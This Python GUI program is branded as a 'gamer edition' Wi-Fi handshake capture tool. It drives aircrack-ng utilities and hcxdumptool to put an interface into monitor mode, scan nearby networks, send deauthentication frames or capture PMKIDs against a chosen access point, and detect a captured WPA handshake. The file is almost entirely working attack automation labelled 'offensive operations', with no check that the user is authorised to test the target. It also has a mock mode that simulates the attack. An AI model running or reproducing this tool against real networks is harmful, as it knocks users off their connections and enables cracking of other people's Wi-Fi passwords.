import customtkinter as ctk
import tkinter as tk
from tkinter import messagebox
import subprocess
import threading
import time
import re
import os
import signal
import csv
from datetime import datetime
import random
import shutil

# Set appearance and theme
ctk.set_appearance_mode("Dark")

# Custom "Gamer" colors
NEON_GREEN = "#39FF14"
NEON_MAGENTA = "#FF00FF"
NEON_CYAN = "#00FFFF"
BLOOD_RED = "#FF0000"

class WiFiAuditorGamer(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("WIFI HANDSHAKE CAPTURE TOOL v3.0 - GAMER EDITION")
        self.geometry("1100x850")
        self.configure(fg_color="#0D0D0D")

        # Configuration
        self.temp_dir = f"/tmp/wifi_handshake_{os.getpid()}"
        os.makedirs(self.temp_dir, exist_ok=True)
        self.log_file = os.path.join(self.temp_dir, "wifi_handshake.log")
        self.output_file = "handshake_capture"

        # State variables
        self.selected_interface = tk.StringVar()
        self.monitor_interface = None
        self.scan_running = False
        self.attack_running = False
        self.networks = []
        self.scan_process = None
        self.attack_process = None
        self.capture_process = None
        self.handshake_found = False
        self.mock_mode = not self.check_system_compatibility()

        self.setup_ui()
        self.log("Application initialized" + (" (MOCK MODE ENABLED)" if self.mock_mode else ""))

    def check_system_compatibility(self):
        if os.name != 'posix': return False
        tools = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
        for tool in tools:
            if shutil.which(tool) is None:
                return False
        return True

    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_msg = f"[{timestamp}] {message}\n"
        with open(self.log_file, "a") as f:
            f.write(log_msg)

        if hasattr(self, "log_textbox"):
            self.log_textbox.insert("end", log_msg)
            self.log_textbox.see("end")

    def setup_ui(self):
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # Sidebar
        self.sidebar = ctk.CTkFrame(self, width=250, corner_radius=0, border_color=NEON_GREEN, border_width=2, fg_color="#121212")
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        self.sidebar.grid_rowconfigure(10, weight=1)

        self.logo_label = ctk.CTkLabel(self.sidebar, text="WIFI\nAUDITOR\n3.0", font=ctk.CTkFont(size=32, weight="bold"), text_color=NEON_GREEN)
        self.logo_label.grid(row=0, column=0, padx=20, pady=(30, 20))

        self.iface_label = ctk.CTkLabel(self.sidebar, text="NETWORK INTERFACE", font=ctk.CTkFont(size=14, weight="bold"), text_color=NEON_CYAN)
        self.iface_label.grid(row=1, column=0, padx=20, pady=(20, 0), sticky="w")

        self.iface_combo = ctk.CTkComboBox(self.sidebar, values=["Detecting..."], variable=self.selected_interface, fg_color="#1A1A1A", border_color=NEON_CYAN, button_color=NEON_CYAN, dropdown_fg_color="#1A1A1A")
        self.iface_combo.grid(row=2, column=0, padx=20, pady=10)

        self.refresh_iface_btn = ctk.CTkButton(self.sidebar, text="REFRESH LIST", command=self.refresh_interfaces, fg_color="transparent", border_width=1, text_color=NEON_CYAN, border_color=NEON_CYAN, hover_color="#002222")
        self.refresh_iface_btn.grid(row=3, column=0, padx=20, pady=5)

        self.monitor_btn = ctk.CTkButton(self.sidebar, text="START MONITOR MODE", command=self.toggle_monitor_mode, fg_color=NEON_MAGENTA, text_color="white", hover_color="#800080", font=ctk.CTkFont(weight="bold"))
        self.monitor_btn.grid(row=4, column=0, padx=20, pady=20)

        self.mock_checkbox = ctk.CTkCheckBox(self.sidebar, text="Force Mock Mode", command=self.on_mock_toggle, fg_color=NEON_GREEN, border_color=NEON_GREEN)
        if self.mock_mode: self.mock_checkbox.select()
        self.mock_checkbox.grid(row=5, column=0, padx=20, pady=10, sticky="w")

        # Main Content
        self.main_frame = ctk.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.main_frame.grid(row=0, column=1, sticky="nsew", padx=25, pady=25)
        self.main_frame.grid_columnconfigure(0, weight=1)
        self.main_frame.grid_rowconfigure(2, weight=1)

        # Scanning Controls
        self.scan_frame = ctk.CTkFrame(self.main_frame, border_color=NEON_CYAN, border_width=1, fg_color="#121212")
        self.scan_frame.grid(row=0, column=0, sticky="ew", pady=(0, 15), padx=5)

        self.scan_header = ctk.CTkLabel(self.scan_frame, text="RECONNAISSANCE MODULE", font=ctk.CTkFont(size=16, weight="bold"), text_color=NEON_CYAN)
        self.scan_header.grid(row=0, column=0, columnspan=4, padx=15, pady=10, sticky="w")

        self.scan_time_label = ctk.CTkLabel(self.scan_frame, text="SCAN DURATION (S):")
        self.scan_time_label.grid(row=1, column=0, padx=(15, 5), pady=10)
        self.scan_time_entry = ctk.CTkEntry(self.scan_frame, width=70, border_color=NEON_CYAN, fg_color="#1A1A1A")
        self.scan_time_entry.insert(0, "15")
        self.scan_time_entry.grid(row=1, column=1, padx=5, pady=10)

        self.scan_btn = ctk.CTkButton(self.scan_frame, text="START SCAN", command=self.toggle_scan, fg_color=NEON_CYAN, text_color="black", hover_color="#00CCCC", font=ctk.CTkFont(weight="bold"))
        self.scan_btn.grid(row=1, column=2, padx=10, pady=10)

        self.stop_scan_btn = ctk.CTkButton(self.scan_frame, text="STOP", command=self.stop_scan, fg_color=BLOOD_RED, text_color="white", width=80, hover_color="#990000")
        self.stop_scan_btn.grid(row=1, column=3, padx=10, pady=10)

        self.scan_progress = ctk.CTkProgressBar(self.scan_frame, orientation="horizontal", progress_color=NEON_CYAN)
        self.scan_progress.set(0)
        self.scan_progress.grid(row=2, column=0, columnspan=4, padx=15, pady=(0, 15), sticky="ew")

        # Attack Configuration
        self.attack_frame = ctk.CTkFrame(self.main_frame, border_color=BLOOD_RED, border_width=1, fg_color="#121212")
        self.attack_frame.grid(row=1, column=0, sticky="ew", pady=15, padx=5)

        self.attack_header = ctk.CTkLabel(self.attack_frame, text="OFFENSIVE OPERATIONS", font=ctk.CTkFont(size=16, weight="bold"), text_color=BLOOD_RED)
        self.attack_header.grid(row=0, column=0, columnspan=5, padx=15, pady=10, sticky="w")

        self.target_label = ctk.CTkLabel(self.attack_frame, text="TARGET SSID/BSSID:")
        self.target_label.grid(row=1, column=0, padx=(15, 5), pady=10)
        self.target_combo = ctk.CTkComboBox(self.attack_frame, values=["[No Networks Scanned]"], width=280, border_color=BLOOD_RED, button_color=BLOOD_RED, dropdown_fg_color="#1A1A1A")
        self.target_combo.grid(row=1, column=1, padx=5, pady=10)

        self.attack_type_label = ctk.CTkLabel(self.attack_frame, text="VECT:")
        self.attack_type_label.grid(row=1, column=2, padx=5, pady=10)
        self.attack_type_combo = ctk.CTkComboBox(self.attack_frame, values=["Deauth Standard", "PMKID Capture", "Massive Flood"], width=150, border_color=BLOOD_RED, button_color=BLOOD_RED)
        self.attack_type_combo.grid(row=1, column=3, padx=5, pady=10)

        self.attack_timer_label = ctk.CTkLabel(self.attack_frame, text="LIMIT (S):")
        self.attack_timer_label.grid(row=2, column=0, padx=(15, 5), pady=10, sticky="e")
        self.attack_timer_entry = ctk.CTkEntry(self.attack_frame, width=70, border_color=BLOOD_RED, fg_color="#1A1A1A")
        self.attack_timer_entry.insert(0, "60")
        self.attack_timer_entry.grid(row=2, column=1, padx=5, pady=10, sticky="w")

        self.attack_btn = ctk.CTkButton(self.attack_frame, text="LAUNCH ATTACK", command=self.toggle_attack, fg_color=BLOOD_RED, text_color="white", font=ctk.CTkFont(weight="bold"), hover_color="#CC0000")
        self.attack_btn.grid(row=2, column=3, padx=10, pady=10)

        self.stop_attack_btn = ctk.CTkButton(self.attack_frame, text="ABORT", command=self.stop_attack, fg_color="#333333", text_color="white", width=80)
        self.stop_attack_btn.grid(row=2, column=4, padx=10, pady=10)

        # Log Terminal
        self.log_textbox = ctk.CTkTextbox(self.main_frame, border_color=NEON_GREEN, border_width=1, font=ctk.CTkFont(family="Courier", size=13), fg_color="#050505", text_color=NEON_GREEN)
        self.log_textbox.grid(row=2, column=0, sticky="nsew", pady=15, padx=5)

        # Footer
        self.footer = ctk.CTkFrame(self, height=35, corner_radius=0, fg_color="#000000", border_color=NEON_GREEN, border_width=1)
        self.footer.grid(row=1, column=0, columnspan=2, sticky="ew")
        self.status_label = ctk.CTkLabel(self.footer, text="SYSTEM STATUS: NOMINAL", font=ctk.CTkFont(size=11, weight="bold"), text_color=NEON_GREEN)
        self.status_label.pack(side="left", padx=25)

        self.mode_label = ctk.CTkLabel(self.footer, text="HARDWARE MODE", font=ctk.CTkFont(size=11), text_color=NEON_MAGENTA)
        self.mode_label.pack(side="right", padx=25)

        self.refresh_interfaces()
        self.update_mode_label()

    def update_mode_label(self):
        mode_text = "MODE: MOCK (VIRTUAL)" if self.mock_mode else "MODE: LIVE (HARDWARE)"
        color = NEON_CYAN if not self.mock_mode else NEON_MAGENTA
        self.mode_label.configure(text=mode_text, text_color=color)

    def on_mock_toggle(self):
        self.mock_mode = self.mock_checkbox.get()
        self.log(f"Mock Mode {'enabled' if self.mock_mode else 'disabled'}")
        self.update_mode_label()
        self.refresh_interfaces()

    def refresh_interfaces(self):
        self.log("Probing network interfaces...")
        ifaces = []
        if self.mock_mode:
            ifaces = ["wlan0", "wlan1", "mon0"]
        else:
            try:
                result = subprocess.run(["ip", "link", "show"], capture_output=True, text=True)
                ifaces = re.findall(r"\d+: (\w+):", result.stdout)
                ifaces = [i for i in ifaces if i != "lo"]
            except Exception as e:
                self.log(f"Interface probe failed: {e}")
                ifaces = ["error"]

        self.iface_combo.configure(values=ifaces)
        if ifaces:
            self.selected_interface.set(ifaces[0])
            self.log(f"Found {len(ifaces)} interface(s)")

    def toggle_monitor_mode(self):
        if not self.monitor_interface: self.start_monitor_mode()
        else: self.stop_monitor_mode()

    def start_monitor_mode(self):
        iface = self.selected_interface.get()
        self.log(f"Initiating monitor mode on {iface}...")
        if self.mock_mode:
            self.monitor_interface = f"{iface}mon"
        else:
            try:
                subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
                subprocess.run(["sudo", "airmon-ng", "start", iface], check=True)
                # Detection of actual monitor interface name
                res = subprocess.run(["iwconfig"], capture_output=True, text=True)
                mon_names = re.findall(r"(\w+mon)", res.stdout)
                if mon_names: self.monitor_interface = mon_names[0]
                else: self.monitor_interface = f"{iface}mon"
            except Exception as e:
                self.log(f"Failed to activate monitor mode: {e}")
                return
        self.monitor_btn.configure(text="STOP MONITOR MODE", fg_color="#333333")
        self.log(f"Monitor mode active on {self.monitor_interface}")

    def stop_monitor_mode(self):
        self.log(f"Deactivating monitor mode on {self.monitor_interface}...")
        if not self.mock_mode:
            try:
                subprocess.run(["sudo", "airmon-ng", "stop", self.monitor_interface], check=True)
                subprocess.run(["sudo", "service", "NetworkManager", "restart"], check=True)
            except: pass
        self.monitor_interface = None
        self.monitor_btn.configure(text="START MONITOR MODE", fg_color=NEON_MAGENTA)
        self.log("Interface returned to managed mode")

    def toggle_scan(self):
        if not self.scan_running: self.start_scan()
        else: self.stop_scan()

    def start_scan(self):
        if not self.monitor_interface and not self.mock_mode:
            messagebox.showerror("Error", "Monitor mode required for scanning.")
            return

        try:
            duration = int(self.scan_time_entry.get() or 15)
        except: duration = 15

        self.scan_running = True
        self.scan_btn.configure(text="SCANNING...", state="disabled")
        self.log(f"Network discovery sequence started ({duration}s)")

        threading.Thread(target=self.scan_thread_func, args=(duration,), daemon=True).start()

    def scan_thread_func(self, duration):
        if self.mock_mode:
            for i in range(duration):
                if not self.scan_running: break
                time.sleep(1)
                self.scan_progress.set((i+1)/duration)

            self.networks = [
                {"ssid": "Gaming_Router_5G", "bssid": "AA:BB:CC:11:22:33", "channel": "36", "privacy": "WPA2"},
                {"ssid": "Lag_Free_WiFi", "bssid": "DD:EE:FF:44:55:66", "channel": "6", "privacy": "WPA2"},
                {"ssid": "Noobs_Only", "bssid": "00:11:22:33:44:55", "channel": "11", "privacy": "WPA"}
            ]
        else:
            scan_file = os.path.join(self.temp_dir, "scan")
            cmd = ["sudo", "airodump-ng", "--output-format", "csv", "-w", scan_file, self.monitor_interface]
            self.scan_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            for i in range(duration):
                if not self.scan_running: break
                time.sleep(1)
                self.scan_progress.set((i+1)/duration)

            self.stop_scan_process()
            self.networks = self.parse_scan_results(f"{scan_file}-01.csv")

        self.after(0, self.finish_scan)

    def stop_scan_process(self):
        if self.scan_process:
            try:
                os.kill(self.scan_process.pid, signal.SIGTERM)
                self.scan_process.wait(timeout=2)
            except: pass
            self.scan_process = None

    def parse_scan_results(self, csv_path):
        nets = []
        if not os.path.exists(csv_path): return nets
        try:
            with open(csv_path, 'r', encoding='latin-1') as f:
                reader = csv.reader(f)
                rows = list(reader)
                for row in rows:
                    if len(row) < 14: continue
                    bssid = row[0].strip()
                    if not re.match(r"([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}", bssid): continue
                    nets.append({
                        "bssid": bssid,
                        "channel": row[3].strip(),
                        "privacy": row[5].strip(),
                        "ssid": row[13].strip()
                    })
        except: pass
        return nets

    def finish_scan(self):
        self.scan_running = False
        self.scan_btn.configure(text="START SCAN", state="normal")
        self.scan_progress.set(0)

        target_list = [f"{n['ssid']} ({n['bssid']}) [CH {n['channel']}]" for n in self.networks]
        if not target_list: target_list = ["[No Networks Found]"]
        self.target_combo.configure(values=target_list)
        self.target_combo.set(target_list[0])
        self.log(f"Recon completed: {len(self.networks)} targets identified")

    def stop_scan(self):
        self.scan_running = False
        self.stop_scan_process()
        self.log("Discovery sequence aborted")

    def toggle_attack(self):
        if not self.attack_running: self.start_attack()
        else: self.stop_attack()

    def start_attack(self):
        target_str = self.target_combo.get()
        if "[No Networks" in target_str:
            messagebox.showwarning("Incomplete Data", "Select a valid target.")
            return

        try:
            duration = int(self.attack_timer_entry.get() or 60)
        except: duration = 60

        attack_type = self.attack_type_combo.get()

        bssid_match = re.search(r"\(([0-9a-fA-F:]+)\)", target_str)
        chan_match = re.search(r"\[CH (\d+)\]", target_str)
        if not bssid_match: return

        bssid = bssid_match.group(1)
        channel = chan_match.group(1) if chan_match else "1"

        self.attack_running = True
        self.handshake_found = False
        self.attack_btn.configure(text="ATTACKING...", fg_color="#333333")
        self.log(f"Launching {attack_type} against {bssid}")

        threading.Thread(target=self.attack_thread_func, args=(attack_type, bssid, channel, duration), daemon=True).start()

    def attack_thread_func(self, atype, bssid, channel, duration):
        if self.mock_mode:
            for i in range(duration):
                if not self.attack_running: break
                if i == 10: self.handshake_found = True
                if i % 5 == 0: self.log(f"Simulating attack on {bssid}... ({i}s)")
                time.sleep(1)
        else:
            try:
                subprocess.run(["sudo", "iwconfig", self.monitor_interface, "channel", channel])

                # Start capture in background to check for handshake
                cap_file = os.path.join(self.temp_dir, "capture")
                cap_cmd = ["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", cap_file, self.monitor_interface]
                self.capture_process = subprocess.Popen(cap_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                # Start attack process
                if "Deauth" in atype:
                    pkt_count = "0" if "Massive" in atype else "5"
                    cmd = ["sudo", "aireplay-ng", "-0", pkt_count, "-a", bssid, self.monitor_interface]
                    self.attack_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                elif "PMKID" in atype:
                    cmd = ["sudo", "hcxdumptool", "-i", self.monitor_interface, f"--filterlist_ap={bssid}", "--filtermode=2", "-o", f"{self.temp_dir}/pmkid.pcapng"]
                    self.attack_process = subprocess.Popen(cmd)

                # Monitor for handshake
                for i in range(duration):
                    if not self.attack_running: break
                    time.sleep(1)
                    if self.check_handshake(f"{cap_file}-01.cap"):
                        self.handshake_found = True
                        self.log("!!! HANDSHAKE CAPTURED !!!")
                        break
            except Exception as e:
                self.log(f"Attack failure: {e}")
            finally:
                self.stop_attack_processes()

        self.after(0, self.finish_attack)

    def check_handshake(self, cap_path):
        if not os.path.exists(cap_path): return False
        try:
            res = subprocess.run(["aircrack-ng", cap_path], capture_output=True, text=True)
            return "1 handshake" in res.stdout
        except: return False

    def stop_attack_processes(self):
        for proc_attr in ['attack_process', 'capture_process']:
            proc = getattr(self, proc_attr)
            if proc:
                try:
                    os.kill(proc.pid, signal.SIGTERM)
                    proc.wait(timeout=2)
                except: pass
                setattr(self, proc_attr, None)

    def finish_attack(self):
        self.attack_running = False
        self.attack_btn.configure(text="LAUNCH ATTACK", fg_color=BLOOD_RED)
        if self.handshake_found:
            self.log("Operation SUCCESS: Handshake acquired.")
            messagebox.showinfo("Success", "Handshake captured successfully!")
            self.post_capture_options()
        else:
            self.log("Operation finished. No handshake detected.")

    def post_capture_options(self):
        # Implementation of post-capture dialog
        self.log("Post-capture options available in log directory.")

    def stop_attack(self):
        self.attack_running = False
        self.stop_attack_processes()
        self.log("Attack sequence aborted")

if __name__ == "__main__":
    app = WiFiAuditorGamer()
    app.mainloop()
